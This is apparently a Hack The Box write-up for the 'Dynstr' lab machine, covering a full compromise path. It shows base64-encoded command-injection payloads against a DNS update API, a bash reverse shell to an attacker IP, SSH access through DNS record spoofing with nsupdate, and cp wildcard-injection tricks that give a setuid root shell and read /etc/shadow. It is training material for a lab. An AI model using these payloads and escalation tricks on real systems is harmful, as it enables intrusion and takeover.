@@ -1,0 +1,213 @@
+Dynstr
+
+05th October 2021 / Document No D21.100.134
+Prepared By: MrR3boot
+Machine Creator(s): jkr
+Difficulty: Medium
+Classification: Official
+Synopsis
+
+Dynstr is a medium difficulty Linux machine featuring a blog providing Dynamic DNS services. The
+application API is vulnerable to command injection using which a foothold can be gained. Enumerating one
+of the users folders leaks SSH private key. Updating DNS zone records allows SSH access which helps in
+lateral movement. By exploiting a wildcard injection in a bash script root access can be obtained.
+
+Skills Required
+
+      Enumeration
+      Basic Knowledge of Linux
+      OWASP Top 10
+
+Skills Learned
+
+      Command Injection
+      Dynamic DNS Exploitation
+      cp Wildcard Injection
+Enumeration
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.129.233.48 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC 10.129.233.48
+
+Nmap scan reveals that the target server has 22 (OpenSSH), 53 (ISC BIND) and 80 (Apache httpd) open.
+
+Apache
+
+Let's browse to port 80.
+The blog highlights about DYNA DNS which is a dynamic DNS service.
+
+Services section of the page reveals that this service uses the same API as no-ip.com service. It also
+provides credentials. Referring the noip.com document explains how we can update ip address for a
+domain by sending below request.
+
+   http://username:password@dynupdate.no-ip.com/nic/update?
+   hostname=mytest.example.com&myip=192.0.2.25
+Using the given credentials we can try to send a request to the server.
+Foothold
+
+It seems that it updates the DNS entry for test.dnsalias.htb with the given IP address. By appending a
+special character before domain name throws an error.
+
+nsupdate is a Dynamic DNS update utility in linux. An example will be like below.
+   # nsupdate
+   > update delete oldhost.example.com A
+   > update add newhost.example.com 86400 A 172.16.1.1
+   > send
+
+If application isn't sanitizing the hostname parameter this could lead to a command injection. Let's test this
+by sending the below input in the hostname parameter.
+
+   >>> import urllib.parse
+   >>> urllib.parse.quote_plus('`curl 10.10.14.12:8000`')
+   '%60curl+10.10.14.12%3A8000%60'
+
+The error message shows the given hostname name after first dot. Looks like the application is splitting
+given hostname and checking domain against supported domains. Let's encode the payload.
+
+   echo -n 'curl 10.10.14.12:8000' | base64 -w0
+   echo -n Y3VybCAxMC4xMC4xNC4xMjo4MDAw | base64 -d | bash
+   curl "http://dynadns:sndanyd@10.129.233.48/nic/update?hostname=%60echo%20-
+   n%20Y3VybCAxMC4xMC4xNC4xMjo4MDAw|base64%20-d|bash%60.dnsalias.htb&myip=10.10.14.12"
+This sends a request to our listener. Same way we encode reverse shell payload.
+   echo -n 'bash -c "bash -i >&/dev/tcp/10.10.14.12/1234 0>&1"' | base64 -w0
+   echo -n YmFzaCAtYyAiYmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjEyLzEyMzQgMD4mMSI= | base64 -
+   d | bash
+   curl "http://dynadns:sndanyd@10.129.233.48/nic/update?hostname=%60echo%20-
+   n%20YmFzaCAtYyAiYmFzaCAtaSA%2bJi9kZXYvdGNwLzEwLjEwLjE0LjEyLzEyMzQgMD4mMSI=|base64%20-
+   d|bash%60.dnsalias.htb&myip=10.10.14.12"
+
+Stand up a listener on port 1234 and send request.
+
+Issue below commands to upgrade the shell.
+ctrl+z
+stty -raw echo
+fg
+return
+export TERM=xterm
+Lateral Movement
+
+Enumerating users on the box we see two users present.
+
+bindmgr contains a folder with text files.
+
+Checking strace-C62796521.txt file contents reveals a SSH private key.
+
+Trying SSH login with this key as bindmgr fails.
+We check the authorized_keys content.
+Checking online references for from option, we learn that this is used to restrict source addresses. The host
+connecting to SSH must match the *.infra.dyna.htb domain name pattern. We can check the DNS
+configuration in /etc/bind folder.
+
+The configuration reveals that using infra.key it is possible to add or remove records from zones and we
+can read the key. Let's try to update the configuration by issuing below commands.
+
+   nsupdate -k /etc/bind/infra.key
+   update add test.infra.dyna.htb 86400 A 10.10.14.12
+   update add 12.14.10.10.in-addr.arpa 300 PTR test.infra.dyna.htb
+   send
+After adding forward and reverse zone entries, we can login to SSH as bindmgr .
+Privilege Escalation
+
+Enumerating the server using LinEnum.sh shows that bindmgr can run bindmgr.sh script as root.
+
+Let's check the contents of the script.
+
+   #!/usr/bin/bash
+   ...
+   BINDMGR_CONF=/etc/bind/named.conf.bindmgr
+   BINDMGR_DIR=/etc/bind/named.bindmgr
+
+   indent() { sed 's/^/ /'; }
+
+   # Check versioning (.version)
+   echo "[+] Running $0 to stage new configuration from $PWD."
+   if [[ ! -f .version ]] ; then
+
+          echo "[-] ERROR: Check versioning. Exiting."
+          exit 42
+   fi
+   if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ;
+   then
+          echo "[-] ERROR: Check versioning. Exiting."
+          exit 43
+   fi
+
+   # Create config file that includes all files from named.bindmgr.
+   echo "[+] Creating $BINDMGR_CONF file."
+   printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
+   for file in * ; do
+
+          printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
+   done
+
+   # Stage new version of configuration files.
+   echo "[+] Staging files to $BINDMGR_DIR."
+   cp .version * /etc/bind/named.bindmgr/
+
+   # Check generated configuration with named-checkconf.
+   echo "[+] Checking staged configuration."
+   named-checkconf $BINDMGR_CONF >/dev/null
+   if [[ $? -ne 0 ]] ; then
+
+          echo "[-] ERROR: The generated configuration is not valid. Please fix following
+   errors: "
+
+          named-checkconf $BINDMGR_CONF 2>&1 | indent
+          exit 44
+   else
+
+          echo "[+] Configuration successfully staged."
+          # *** TODO *** Uncomment restart once we are live.
+          # systemctl restart bind9
+          if [[ $? -ne 0 ]] ; then
+
+                 echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
+                 systemctl status bind9
+          else
+                 echo "[+] Restart of bind9 via systemctl succeeded."
+          fi
+   fi
+Script does the following:
+      Checks the .version file exists in the present directory and copies this file to
+       /etc/bind/named.bindmgr/ directory.
+      Updates the bindmgr configuration with new files and validates configuration using named-
+      checkconf .
+      Finally it restarts bind9 service
+Let's create a .version file and run the script to see it in action.
+
+We see that the file got copied and the ownership changed to root user. It can be also observed in the
+script that cp command uses wildcard while copying the files in the directory.
+   # Stage new version of configuration files.
+   echo "[+] Staging files to $BINDMGR_DIR."
+   cp .version * /etc/bind/named.bindmgr/
+This can lead to wildcard injection and can be exploited in multiple ways. Let's copy /bin/bash to the
+present directory.
+   cp /bin/bash .
+   chmod u+s bash
+   touch -- '--preserve=mode'
+Running bindmgr.sh copies the bash to /etc/bind/named.bindmgr directory preserving the setuid
+permission.
+
+Root shell can now be obtained by issuing below command.
+   /etc/bind/named.bindmgr/bash -p
+
+This can also be exploited to read arbitrary files.
+   echo 45 > .version
+   touch -- '--copy-contents'
+   touch -- '--no-preserve=mode'
+   ln -s /etc/shadow test
+
+Executing bindmgr.sh will copy the contents of root.txt file to /etc/bind/named.bindmgr directory.
+Alternatively we can write to arbitrary locations to gain root access. One such location is /etc/update-
+motd.d folder where the scripts will run with root privileges when someone connects through SSH.
+
+   echo 30 > .version
+   cat > run-it << EOF
+   #!/bin/bash
+   id
+   EOF
+   chmod 777 run-it
+   ln -s /etc/update-motd.d motd
+   touch -- '--target-directory=motd'
+   sudo bindmgr.sh
+
